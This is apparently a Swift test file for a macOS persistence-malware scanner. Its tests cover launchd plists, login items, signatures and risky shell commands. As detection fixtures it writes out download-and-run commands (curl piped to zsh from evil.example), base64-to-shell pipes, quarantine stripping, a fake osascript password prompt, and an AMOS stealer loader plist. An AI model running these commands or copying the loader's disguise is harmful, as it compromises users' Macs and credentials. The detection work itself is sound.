import Foundation
import Testing

@testable import MacxCore

// MARK: - Fixtures

struct FakeSignatures: SignatureChecking {
    var byPath: [String: SignatureInfo]
    func check(_ path: String) -> SignatureInfo {
        if let s = byPath[path] { return s }
        return FileManager.default.fileExists(atPath: path) ? .unsigned : .missing
    }
}

extension TempDir {
    @discardableResult
    func plist(_ path: String, _ dict: [String: Any]) throws -> URL {
        let data = try PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0)
        let f = url.appendingPathComponent(path)
        try FileManager.default.createDirectory(at: f.deletingLastPathComponent(), withIntermediateDirectories: true)
        try data.write(to: f)
        return f
    }
}

/// The two AMOS loaders found on a real infected Mac in 2026 looked like this.
func amosLoader() -> [String: Any] {
    [
        "Label": "com.apple.accountsd.helper",
        "ProgramArguments": [
            "/bin/bash", "-c",
            "while true; do \"/Users/victim/Library/Application Support/.com.apple.accountsd/AccountsHelper\"; sleep 5; done",
        ],
        "RunAtLoad": true,
        "KeepAlive": true,
    ]
}

func appleBash() -> FakeSignatures { FakeSignatures(byPath: ["/bin/bash": .apple, "/bin/zsh": .apple]) }

// MARK: - launchd parsing

@Suite("launchd plist parsing")
struct LaunchdParsingTests {
    @Test func readsLabelProgramArgumentsAndFlags() throws {
        let tmp = try TempDir()
        let f = try tmp.plist("LaunchDaemons/com.apple.accountsd.helper.plist", amosLoader())
        let item = try #require(LaunchdParser.parse(f, kind: .launchDaemon, signatures: appleBash()))
        #expect(item.label == "com.apple.accountsd.helper")
        #expect(item.program == "/bin/bash")
        #expect(item.arguments.count == 3)
        #expect(item.runsAsRoot)
        #expect(item.runAtLoad)
        #expect(item.keepAlive)
        #expect(item.signature == .apple)
        #expect(!item.contentHash.isEmpty)
    }

    @Test func programKeyWinsAndUserNameControlsRoot() throws {
        let tmp = try TempDir()
        let f = try tmp.plist(
            "LaunchDaemons/x.plist",
            [
                "Label": "com.vendor.x", "Program": "/opt/x/bin/x", "ProgramArguments": ["ignored"], "UserName": "nobody",
                "KeepAlive": ["SuccessfulExit": false],
            ])
        let item = try #require(LaunchdParser.parse(f, kind: .launchDaemon, signatures: FakeSignatures(byPath: [:])))
        #expect(item.program == "/opt/x/bin/x")
        #expect(!item.runsAsRoot)
        #expect(item.keepAlive)  // a KeepAlive dictionary still keeps it alive
        #expect(item.signature == .missing)
    }

    @Test func agentsNeverRunAsRoot() throws {
        let tmp = try TempDir()
        let f = try tmp.plist("LaunchAgents/a.plist", ["Label": "com.vendor.a", "ProgramArguments": ["/bin/zsh"]])
        let item = try #require(LaunchdParser.parse(f, kind: .launchAgent, signatures: appleBash()))
        #expect(!item.runsAsRoot)
    }

    @Test func brokenPlistIsReportedNotDropped() throws {
        let tmp = try TempDir()
        let f = try tmp.file("LaunchAgents/broken.plist", "not a plist")
        let item = try #require(LaunchdParser.parse(f, kind: .userLaunchAgent, signatures: appleBash()))
        #expect(item.label == nil)
        #expect(item.program == nil)
        #expect(item.unreadable)
    }
}

// MARK: - BTM

@Suite("Background Task Management dump")
struct BTMTests {
    let sample = """
        ========================
         Records for UID 501 : 1234
        ========================

         ServiceManagement migrated: true

         Items:

         #1:
                         UUID: 598A9B6F
                         Name: WireGuardLoginItemHelper
               Developer Name: (null)
              Team Identifier: X7UJ388FXK
                         Type: login item (0x4)
                        Flags: [ sandboxed ] (0x40)
                  Disposition: [enabled, allowed, notified] (0xb)
                   Identifier: 4.org.amnezia.awg.login-item-helper
                          URL: Contents/Library/LoginItems/WireGuardLoginItemHelper.app
            Bundle Identifier: org.amnezia.awg.login-item-helper

         #2:
                         UUID: 49D9B618
                         Name: AnyDesk
              Team Identifier: KHRWM533LU
                         Type: legacy daemon (0x10010)
                  Disposition: [enabled, disallowed, notified] (0x9)
                          URL: /Library/LaunchDaemons/com.philandro.anydesk.service.plist
              Executable Path: /Applications/AnyDesk.app/Contents/MacOS/AnyDesk

         #3:
                         Name: Weird
                         Type: something new (0x99999)
        """

    @Test func parsesRecords() {
        let records = BTMParser.parse(sample)
        #expect(records.count == 3)
        #expect(records[0].name == "WireGuardLoginItemHelper")
        #expect(records[0].type == "login item")
        #expect(records[0].teamID == "X7UJ388FXK")
        #expect(records[0].enabled && records[0].allowed)
        #expect(records[0].bundleID == "org.amnezia.awg.login-item-helper")
        #expect(records[1].type == "legacy daemon")
        #expect(records[1].enabled && !records[1].allowed)
        #expect(records[1].executablePath == "/Applications/AnyDesk.app/Contents/MacOS/AnyDesk")
        #expect(records[2].type == "something new")  // unknown types are kept, not dropped
    }

    @Test func loginItemsAndBackgroundTasksBecomeItems() {
        let items = BTMParser.items(from: BTMParser.parse(sample))
        #expect(items.map(\.kind) == [.loginItem])
        #expect(items[0].label == "WireGuardLoginItemHelper")
        #expect(items[0].teamID == "X7UJ388FXK")
    }
}

// MARK: - Command patterns

@Suite("Download-and-run patterns")
struct CommandPatternTests {
    @Test func flagsPipesIntoShells() {
        #expect(CommandPatterns.match("curl -fsSL https://x.example/install.sh | bash").contains(.downloadToShell))
        #expect(CommandPatterns.match("curl -sL https://riverkernel.example/u.sh|zsh").contains(.downloadToShell))
        #expect(CommandPatterns.match("wget -qO- https://x | sh").contains(.downloadToShell))
        #expect(CommandPatterns.match("bash <(curl -s https://x/y.sh)").contains(.downloadToShell))
        #expect(CommandPatterns.match("eval \"$(curl -s https://x)\"").contains(.downloadToShell))
    }

    @Test func flagsBase64IntoShells() {
        #expect(CommandPatterns.match("echo 'Y3VybCAtc0wg' | base64 -D | zsh").contains(.base64ToShell))
        #expect(CommandPatterns.match("echo abc | base64 --decode | bash").contains(.base64ToShell))
    }

    @Test func flagsQuarantineStripping() {
        #expect(CommandPatterns.match("xattr -d com.apple.quarantine ~/Downloads/x.app").contains(.quarantineStrip))
        #expect(CommandPatterns.match("sudo xattr -cr /Applications/Cracked.app").contains(.quarantineStrip))
        #expect(CommandPatterns.match("xattr -rd com.apple.quarantine x").contains(.quarantineStrip))
    }

    @Test func flagsPasswordPrompts() {
        #expect(
            CommandPatterns.match("osascript -e 'display dialog \"Enter password\" default answer \"\" with hidden answer'")
                .contains(.passwordPrompt))
        #expect(CommandPatterns.match("dscl . -authonly \"$USER\" \"$pw\"").contains(.passwordCheck))
    }

    @Test func leavesNormalCommandsAlone() {
        #expect(CommandPatterns.match("eval \"$(/opt/homebrew/bin/brew shellenv)\"").isEmpty)
        #expect(CommandPatterns.match("curl -o file.zip https://x/file.zip").isEmpty)
        #expect(CommandPatterns.match("export PATH=$HOME/.local/bin:$PATH").isEmpty)
        #expect(CommandPatterns.match("xattr -l file").isEmpty)
        #expect(CommandPatterns.match("base64 -D < in > out").isEmpty)
    }
}

// MARK: - Rules

@Suite("Persistence rules")
struct PersistenceRuleTests {
    func item(
        _ kind: PersistenceKind = .launchDaemon, label: String? = "com.vendor.x", program: String? = "/opt/x",
        args: [String] = [], root: Bool = true, signature: SignatureInfo = .developerID(team: "ABCDE12345"),
        path: String = "/Library/LaunchDaemons/x.plist"
    ) -> PersistenceItem {
        PersistenceItem(
            kind: kind, path: path, label: label, program: program, arguments: args, runsAsRoot: root,
            runAtLoad: true, keepAlive: false, signature: signature, teamID: nil, contentHash: "h")
    }

    func rules(_ items: [PersistenceItem], home: String = "/Users/victim") -> Set<String> {
        Set(PersistenceRules.evaluate(items, home: URL(fileURLWithPath: home)).map(\.rule))
    }

    @Test func catchesTheAMOSLoader() throws {
        let tmp = try TempDir()
        let f = try tmp.plist("LaunchDaemons/com.apple.accountsd.helper.plist", amosLoader())
        let loader = try #require(LaunchdParser.parse(f, kind: .launchDaemon, signatures: appleBash()))
        let findings = PersistenceRules.evaluate([loader], home: URL(fileURLWithPath: "/Users/victim"))
        let ids = Set(findings.map(\.rule))
        #expect(ids.contains("fake-apple-label"))
        #expect(ids.contains("hidden-folder"))
        #expect(ids.contains("shell-loop"))
        #expect(findings.first?.severity == .critical)  // sorted most severe first
    }

    @Test func appleLabelRunningAnAppleBinaryDirectlyIsOnlyLow() {
        let f = PersistenceRules.evaluate(
            [item(label: "com.apple.something", program: "/usr/libexec/x", signature: .apple)],
            home: URL(fileURLWithPath: "/Users/v"))
        #expect(f.map(\.rule) == ["apple-label-outside-system"])
        #expect(f.first?.severity == .low)
    }

    @Test func missingProgramIsHighForRootAutostart() {
        let f = PersistenceRules.evaluate(
            [item(program: "/Applications/AnyDesk.app/Contents/MacOS/AnyDesk", signature: .missing)],
            home: URL(fileURLWithPath: "/Users/v"))
        #expect(f.map(\.rule) == ["missing-program"])
        #expect(f.first?.severity == .high)
        let agent = PersistenceRules.evaluate(
            [item(.userLaunchAgent, program: "/gone", root: false, signature: .missing)],
            home: URL(fileURLWithPath: "/Users/v"))
        #expect(agent.first?.severity == .medium)
    }

    @Test func unsignedAndAdHocPrograms() {
        #expect(rules([item(signature: .unsigned)]).contains("unsigned-program"))
        #expect(rules([item(signature: .adHoc)]).contains("adhoc-program"))
        // Anyone can make a self-signed certificate, so it counts like ad-hoc, under its own name.
        #expect(rules([item(signature: .selfSigned(name: "Some Cert"))]).contains("self-signed-program"))
        #expect(rules([item(signature: .developerID(team: "T"))]).isEmpty)
    }

    @Test func tempAndDownloadsLocations() {
        #expect(rules([item(program: "/private/tmp/x")]).contains("temp-location"))
        #expect(rules([item(program: "/Users/Shared/.x/run")]).contains("temp-location"))
        #expect(rules([item(program: "/Users/victim/Downloads/tool")]).contains("temp-location"))
    }

    @Test func hiddenFoldersInsideLibraryAreHighElsewhereMedium() {
        let lib = PersistenceRules.evaluate(
            [item(program: "/Users/victim/Library/Application Support/.x/run")],
            home: URL(fileURLWithPath: "/Users/victim"))
        #expect(lib.first { $0.rule == "hidden-folder" }?.severity == .high)
        let dot = PersistenceRules.evaluate([item(program: "/Users/victim/.local/bin/tool")], home: URL(fileURLWithPath: "/Users/victim"))
        #expect(dot.first { $0.rule == "hidden-folder" }?.severity == .medium)
    }

    @Test func hiddenSupportFoldersAndShellFiles() {
        let fakeApple = PersistenceItem.hiddenFolder("/Users/v/Library/Application Support/.com.apple.accountsd")
        let other = PersistenceItem.hiddenFolder("/Users/v/Library/Application Support/.thing")
        let f = PersistenceRules.evaluate([fakeApple, other], home: URL(fileURLWithPath: "/Users/v"))
        #expect(f.first { $0.item.path.hasSuffix(".com.apple.accountsd") }?.severity == .critical)
        #expect(f.first { $0.item.path.hasSuffix(".thing") }?.severity == .medium)

        let shell = PersistenceItem.shellLine("/Users/v/.zshrc", line: 12, text: "curl -s https://x/y | zsh")
        #expect(PersistenceRules.evaluate([shell], home: URL(fileURLWithPath: "/Users/v")).map(\.rule) == ["download-to-shell"])
    }

    @Test func normalSignedItemsProduceNoFindings() {
        #expect(rules([item(), item(.userLaunchAgent, root: false)]).isEmpty)
    }
}

// MARK: - Scanning a whole fake Mac

@Suite("Persistence scan")
struct PersistenceScanTests {
    @Test func scansLaunchdFoldersShellFilesAndHiddenFolders() throws {
        let tmp = try TempDir()
        try tmp.plist("sys/Library/LaunchDaemons/com.apple.accountsd.helper.plist", amosLoader())
        try tmp.plist("sys/Library/LaunchAgents/com.vendor.agent.plist", ["Label": "com.vendor.agent", "Program": "/bin/zsh"])
        try tmp.plist("home/Library/LaunchAgents/com.me.thing.plist", ["Label": "com.me.thing", "Program": "/bin/zsh"])
        try tmp.file("home/Library/Application Support/.com.apple.accountsd/AccountsHelper", "x")
        try tmp.file("home/Library/Application Support/.DS_Store", "x")
        try tmp.file("home/.zshrc", "export A=1\neval \"$(/opt/homebrew/bin/brew shellenv)\"\ncurl -s https://evil.example/x | zsh\n")

        let roots = PersistenceRoots(system: tmp.url.appendingPathComponent("sys"), home: tmp.url.appendingPathComponent("home"))
        let items = PersistenceScanner.scan(roots, signatures: appleBash(), btm: [], cron: nil)
        let kinds = items.map(\.kind)
        #expect(kinds.filter { $0 == .launchDaemon }.count == 1)
        #expect(kinds.filter { $0 == .launchAgent }.count == 1)
        #expect(kinds.filter { $0 == .userLaunchAgent }.count == 1)
        #expect(kinds.filter { $0 == .hiddenFolder }.count == 1)  // .DS_Store is not a folder finding
        #expect(kinds.filter { $0 == .shellStartup }.count == 1)  // only the risky line, at line 3
        #expect(items.first { $0.kind == .shellStartup }?.label == "line 3")
    }

    @Test func cronLinesAreItems() {
        let items = PersistenceScanner.cronItems("# comment\n*/5 * * * * /Users/v/.x/run\n\n")
        #expect(items.count == 1)
        #expect(items[0].kind == .cron)
        #expect(items[0].program == "/Users/v/.x/run")
    }
}

// MARK: - Baseline and diff

@Suite("Persistence baseline")
struct BaselineTests {
    func item(_ path: String, hash: String) -> PersistenceItem {
        PersistenceItem(
            kind: .userLaunchAgent, path: path, label: path, program: "/bin/x", arguments: [], runsAsRoot: false,
            runAtLoad: true, keepAlive: false, signature: .apple, teamID: nil, contentHash: hash)
    }

    @Test func diffFindsAddedRemovedAndChanged() {
        let old = [item("/a", hash: "1"), item("/b", hash: "1"), item("/c", hash: "1")]
        let new = [item("/a", hash: "1"), item("/b", hash: "2"), item("/d", hash: "1")]
        let d = PersistenceBaseline.diff(old: old, new: new)
        #expect(d.added.map(\.path) == ["/d"])
        #expect(d.removed.map(\.path) == ["/c"])
        #expect(d.changed.map(\.path) == ["/b"])
        #expect(!d.isEmpty)
        #expect(PersistenceBaseline.diff(old: old, new: old).isEmpty)
    }

    @Test func savesAndLoads() throws {
        let tmp = try TempDir()
        let file = tmp.url.appendingPathComponent("baseline.json")
        let items = [item("/a", hash: "1")]
        try PersistenceBaseline.save(items, to: file)
        #expect(try PersistenceBaseline.load(from: file) == items)
    }
}

// MARK: - Real code signatures

@Suite("Code signature checks")
struct CodeSignatureTests {
    @Test func appleBinaryIsApple() {
        #expect(CodeSignatureChecker().check("/bin/ls") == .apple)
    }

    @Test func missingAndPlainFiles() throws {
        let tmp = try TempDir()
        #expect(CodeSignatureChecker().check(tmp.url.appendingPathComponent("nope").path) == .missing)
        let script = try tmp.file("run.sh", "#!/bin/sh\necho hi\n")
        #expect(CodeSignatureChecker().check(script.path) == .unsigned)
    }

    @Test func fileWeCantReadIsUnreadableNotUnsigned() throws {
        let tmp = try TempDir()
        let f = try tmp.file("root-only", "x")
        try FileManager.default.setAttributes([.posixPermissions: 0o000], ofItemAtPath: f.path)
        defer { try? FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: f.path) }
        guard getuid() != 0 else { return }  // root can read anything
        #expect(CodeSignatureChecker().check(f.path) == .unreadable)
    }

    @Test func unreadableProgramIsInfoNotAFinding() {
        let item = PersistenceItem(
            kind: .launchDaemon, path: "/Library/LaunchDaemons/x.plist", label: "com.vendor.x",
            program: "/Library/PrivilegedHelperTools/x", arguments: [], runsAsRoot: true, runAtLoad: true,
            keepAlive: false, signature: .unreadable, teamID: nil, contentHash: "h")
        let f = PersistenceRules.evaluate([item], home: URL(fileURLWithPath: "/Users/v"))
        #expect(f.map(\.rule) == ["unreadable-program"])
        #expect(f.first?.severity == .info)
    }

    @Test func certificateWithoutATeamIsSelfSigned() {
        #expect(SignatureInfo.classify(adHocFlag: true, team: nil, leafName: nil) == .adHoc)
        #expect(
            SignatureInfo.classify(adHocFlag: false, team: "ABCDE12345", leafName: "Developer ID Application: X")
                == .developerID(team: "ABCDE12345"))
        #expect(
            SignatureInfo.classify(adHocFlag: false, team: nil, leafName: "Macximesed Local Signing")
                == .selfSigned(name: "Macximesed Local Signing"))
        #expect(SignatureInfo.classify(adHocFlag: false, team: nil, leafName: nil) == .adHoc)
        #expect(
            SignatureInfo.selfSigned(name: "Macximesed Local Signing").label == "self-signed (Macximesed Local Signing, no developer team)")
    }

    @Test func adHocSignedBinary() throws {
        let tmp = try TempDir()
        let bin = tmp.url.appendingPathComponent("tool")
        try FileManager.default.copyItem(atPath: "/bin/ls", toPath: bin.path)
        try ProcessRunner().run("/usr/bin/codesign", ["--remove-signature", bin.path])
        #expect(CodeSignatureChecker().check(bin.path) == .unsigned)
        try ProcessRunner().run("/usr/bin/codesign", ["-s", "-", bin.path])
        #expect(CodeSignatureChecker().check(bin.path) == .adHoc)
    }
}

@Suite("sudo macx persist checks the user who ran sudo")
struct PersistInvokingUserTests {
    @Test func usesTheSudoUsersHome() throws {
        let me = try #require(getpwuid(getuid())).pointee
        let name = String(cString: me.pw_name)
        let home = String(cString: me.pw_dir)
        let u = try #require(PersistenceRoots.invokingUser(euid: 0, environment: ["SUDO_USER": name]))
        #expect(u.name == name)
        #expect(u.home.path == home)
    }

    @Test func notUnderSudoOrForRootItselfThereIsNone() {
        #expect(PersistenceRoots.invokingUser(euid: 501, environment: ["SUDO_USER": "someone"]) == nil)
        #expect(PersistenceRoots.invokingUser(euid: 0, environment: [:]) == nil)
        #expect(PersistenceRoots.invokingUser(euid: 0, environment: ["SUDO_USER": "root"]) == nil)
        #expect(PersistenceRoots.invokingUser(euid: 0, environment: ["SUDO_USER": "no-such-user-macx"]) == nil)
    }

    @Test func readsBothCrontabsUnderSudo() {
        #expect(PersistenceScanner.crontabCommands(sudoUser: "lao") == [["-l"], ["-u", "lao", "-l"]])
        #expect(PersistenceScanner.crontabCommands(sudoUser: nil) == [["-l"]])
    }
}
